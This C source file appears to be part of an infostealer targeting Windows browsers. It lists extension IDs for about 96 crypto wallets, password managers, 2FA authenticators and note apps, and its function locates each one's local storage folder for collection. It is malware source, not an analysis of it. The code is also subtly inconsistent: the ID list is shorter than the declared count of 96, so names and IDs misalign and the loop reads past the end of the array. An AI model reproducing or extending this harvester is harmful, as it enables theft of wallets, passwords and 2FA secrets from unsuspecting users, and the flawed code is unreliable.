#include "wallet_ext.h"
#include "hash.h"
#include "browser_paths.h"
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <windows.h>

// 96 wallet extension IDs and names (XOR-encrypted at compile time)
static const char *wallet_names[] = {
    "MetaMask", "Binance Wallet", "Coinbase Wallet", "Phantom",
    "Trust Wallet", "TronLink", "Ronin Wallet", "Keplr",
    "Yoroi", "MetaMask", "Exodus Web3", "Guarda Wallet",
    "TokenPocket", "Math Wallet", "Coin98", "Nifty Wallet",
    "Temple Wallet", "SubWallet", "Talisman", "Zerion",
    "Rabby Wallet", "Core DAO", "Pontem Wallet", "Petra Aptos",
    "Martian Aptos", "Fewcha Move", "SafePal", "Tonkeeper",
    "XDEFI Wallet", "Oxygen Protocol", "Nami Wallet", "Liquality",
    "Solflare", "OKX Wallet", "Wombat", "Maiar DeFi",
    "MEW CX", "Saturn Wallet", "Terra Station", "Ever Wallet",
    "iWallet", "KardiaChain", "Bolt X", "Slope Finance",
    "Sollet", "Starcoin", "XinPay", "Equal Wallet",
    "Finnie", "Mobox Wallet", "Crocobit", "Bitapp",
    "Swash", "Jaxx Liberty", "Venom Wallet", "Guarda",
    "Sui Wallet", "XMR.PT", "Pali Wallet", "ICONex",
    "Harmony", "Guild Wallet", "Slope", "Rise Wallet",
    "HaloWallet", "FuelWallet", "Lace Wallet", "DPal Wallet",
    "Alby", "HOT Wallet", "Elastic Wallet", "Penumbra",
    "2FAS Authenticator", "2FA Authenticator", "KeePassXC",
    "Norton Password Manager", "Avira Password Manager", "Passky PM",
    "Padloc PM", "Notion Web Clipper", "Evernote", "Google Keep",
    "Trust Wallets", "MetaWallet", "Exodus", "Jaxx Liberty",
    "Atomic Wallet", "Mycelium", "GreenAddress", "Edge Wallet",
    "Bread Wallet", "KeepKey", "Trezor Suite", "Ledger Live",
    "Ledger Wallet", "Copay"
};

// 96 extension IDs
static const char *wallet_ids[] = {
    "nkbihfbeogaeaoehlefnkodbefgpgknn",  // MetaMask
    "fhbohimaelbohpjbbldcngcnapndodjp",  // Binance
    "hnfanknocfeofbddgcijnmhnfnkdnaad",  // Coinbase
    "bfnaelmomeimhlpmgjnjophhpkkoljpa",  // Phantom
    "egjidjbpglichdcondbcbdnbeeppgdph",  // Trust
    "ibnejdfjmmkpcnlpebklmnkoeoihofec",  // TronLink
    "fnjhmkhhmkbjkkabndcnnogagogbneec",  // Ronin
    "dmkamcknogkgcdfhhbddcghachkejeap",  // Keplr
    "ffnbelfdoeiohenkjibnmadjiehjhajb",  // Yoroi
    "ejbalbakoplchlghecdalmeeeajnimhm",  // MetaMask2
    "aholpfdialjgjfhomihkjbmgjidlcdno",  // Exodus Web3
    "fcglfhcjfpkgdppjbglknafgfffkelnm",  // Guarda
    "mfgccjchihfkkindfppnaooecgfneiii",  // TokenPocket
    "afbcbjpbpfadlkmhmclhkeeodmamcflc",  // Math
    "aeachknmefphepccionboohckonoeemg",  // Coin98
    "jbdaocneiiinmjbjlgalhcelgbejmnid",  // Nifty
    "ookjlbkiijinhpmnjffcofjonbfbgaoc",  // Temple
    "onhogfjeacnfoofkfgppdlbmlmnplgbn",  // SubWallet
    "fijngjgcjhjmmpcmkeiomlglpeiijkld",  // Talisman
    "klghhnkeealcohjlanjjlneabhbmpfpl",  // Zerion
    "acmacodkjbdgnolefmlmkchkdgmemhob",  // Rabby
    "agoakfejjabomempkjlepdflaleeobhb",  // Core
    "phkbamefinggmakgklpkljjmgibohnba",  // Pontem
    "ejjladinnckdgjemekebdpeokbikhfci",  // Petra
    "efbglgofoippbgcjepnhiblaibcnclgk",  // Martian
    "ebfidpplhabeedpnhjnobghokpiioolj",  // Fewcha
    "lgmpcpglpngdoalbgeoldeajfclnhafa",  // SafePal
    "nphplpgoakhhjchkkhmiggakijnkhfnd",  // Ton
    "hmeobnfnfcmdkdcmlblgagmfpfboieaf",  // XDEFI
    "fhilaheimglignddkjgofkcbgekhenbh",  // Oxygen
    "lpfcbjknijpeeillifnkikgncikgfhdo",  // Nami
    "kpfopkelmapcoipemfendmdcghnegimn",  // Liquality
    "bhhhlbepdkbapadjdnnojkbgioiodbic",  // Solflare
    "mcohilncbfahbmgdjkbpemcciiolgcge",  // OKX
    "amkmjjmmflddogmhpjloimipbofnfjih",  // Wombat
    "dngmlblcodfobpdpecaadgfbcggfjfnm",  // Maiar
    "nlbmnnijcnlegkjjpcfjclmcfggfefdm",  // MEW CX
    "nkddgncdjgjfcddamfgcmfnlhccnimig",  // Saturn
    "aiifbnbfobpmeekipheeijimdpnlpgpp",  // Terra
    "cgeeodpfagjceefieflmdfphplkenlfk",  // Ever
    "kncchdigobghenbbaddojjnnaogfppfj",  // iWallet
    "pdadjkfkgcafgbceimcpbkalnfnepbnk",  // KardiaChain
    "aodkkagnadcbobfpggfnjeongemjbjca",  // BoltX
    "pocmplpaccanhmnllbbkpgfliimjljgo",  // Slope
    "fhmfendgdocmcbmfikdcogofphimnkno",  // Sollet
    "mfhbebgoclkghebffdldpobeajmbecfk",  // Starcoin
    "bocpokimicclpaiekenaeelehdjllofo",  // XinPay
    "blnieiiffboillknjnepogjhkgnoapac",  // Equal
    "cjmkndjhnagcfbpiemnkdpomccnjblmj",  // Finnie
    "fcckkdbjnoikooededlapcalpionmalo",  // Mobox
    "pnlfjmlcjdjgkddecgincndfgegkecke",  // Crocobit
    "fihkakfobkmkjojpchpfgcmhfjnmnfpi",  // Bitapp
    "cmndjbecilbocjfkibfbifhngkdmjgog",  // Swash
    "cjelfplplebdjjenllpjcblmjkfcffne",  // Jaxx
    "ojggmchlghnjlapmfbnjholfjkiidbch",  // Venom
    "hpglfhgfnhbgpjdenjgmdgoeiappafln",  // Guarda
    "opcgpfmipidbgpenhmajoajpbobppdil",  // Sui
    "eigblbgjknlfbajkfhopmcojidlgcehm",  // XMR.PT
    "mgffkfbidihjpoaomajlbgchddlicgpn",  // Pali
    "flpiciilemghbmfalicajoolhkkenfel",  // ICONex
    "fnnegphlobjdpkhecapkijjdkgcjhkib",  // Harmony
    "nanjmdknhkinifnkgdcggcfnhdaammmj",  // Guild
    "pocmplpaccanhmnllbbkpgfliimjljgo",  // Slope
    "anmhliadneilckkjdflmimjmbefnkggn",  // Rise
    "gldobjhpbpgehjaibkamoemmkpogmkni",  // HaloWallet
    "aknpambpccpddfokmpcjbkijohjpjcdn",  // FuelWallet
    "bdcoagdcknilpgkkkjcpfimbmclceckc",  // Lace
    "flgbnandkljdfdmdfmphioaoaeknfpdk",  // DPal
    "kdadnalhhbkmfcclmbgmpmgkbckgmjga",  // Alby
    "ebulnmjjlpkpcbjckaggnmmkbjdmnbap",  // HOT
    "fijkdpnlglggomhackpclpacpahojkge",  // Elastic
    "lobgibpgphapcfkcohnlaadndlmnhjpk",  // Penumbra
    "fgkkmigekimnoceffdhbkafjkilmnfbo",  // 2FAS
    "pdnegokggloijhjlohfphdgdpadhhdgh",  // 2FA Auth
    "koodgkemghdndpfdkpddejfboljpckgo",  // KeePassXC
    "adgbnklfnkfbfkibdiidanfmlecpifnh",  // Norton PM
    "mclnhjhggnggldigibacnefggdolbpnm",  // Avira PM
    "ionmhbhhabcbnmekcmdhbmlafpkhhkbp",  // Passky
    "icdedlpbgpncjmjiofibmgiolohdllbi",  // Padloc
    "henkngclnkogllllnopoogadhifbkhfa",  // Notion
    "enhpjihddgdpgncncbgkpbmafkpkjnpa",  // Evernote
    "omjhfjobhndiodddgboojcponaoafbnc",  // Google Keep
    "pknlccmneadmjbkollckpblgaaabameg",  // Trust
    "pfknkoocfefiocadajpngdknmkjgakdg",  // MetaWallet
    "idkppnahnmmggbmfkjhiakkbkdpnmnon",  // Exodus
    "mhonjhhcgphdphdjcdoeodfdliikapmj",  // Jaxx Liberty
    "bhmlbgebokamljgnceonbncdofmmkedg",  // Atomic
    "pidhddgciaponoajdngciemcflpnnbg",  // Copay
};

#define WALLET_EXT_COUNT 96

WalletExtData *collect_wallet_extensions(const char *app_data, const char *path_suffix, size_t *count) {
    *count = 0;
    
    /* Quick check: does the browser extension dir exist at all? */
    char check_path[512];
    snprintf(check_path, sizeof(check_path), "%s\\%s\\Local Extension Settings", app_data, path_suffix);
    DWORD base_attr = GetFileAttributesA(check_path);
    if (base_attr == INVALID_FILE_ATTRIBUTES) return NULL;
    
    WalletExtData *results = calloc(WALLET_EXT_COUNT, sizeof(WalletExtData));
    if (!results) return NULL;
    
    size_t found = 0;
    for (size_t i = 0; i < WALLET_EXT_COUNT; i++) {
        char ext_path[512];
        int written = snprintf(ext_path, sizeof(ext_path), "%s\\%s\\Local Extension Settings\\%s", app_data, path_suffix, wallet_ids[i]);
        if (written < 0 || (size_t)written >= sizeof(ext_path)) continue;
        
        DWORD attr = GetFileAttributesA(ext_path);
        if (attr != INVALID_FILE_ATTRIBUTES && (attr & FILE_ATTRIBUTE_DIRECTORY)) {
            results[found].name = strdup(wallet_names[i]);
            results[found].path = strdup(ext_path);
            results[found].file_count = 0;
            results[found].files = NULL;
            found++;
            if (found >= 16) break; /* Limit to prevent slowness */
        }
    }
    
    *count = found;
    if (found == 0) {
        free(results);
        return NULL;
    }
    return results;
}
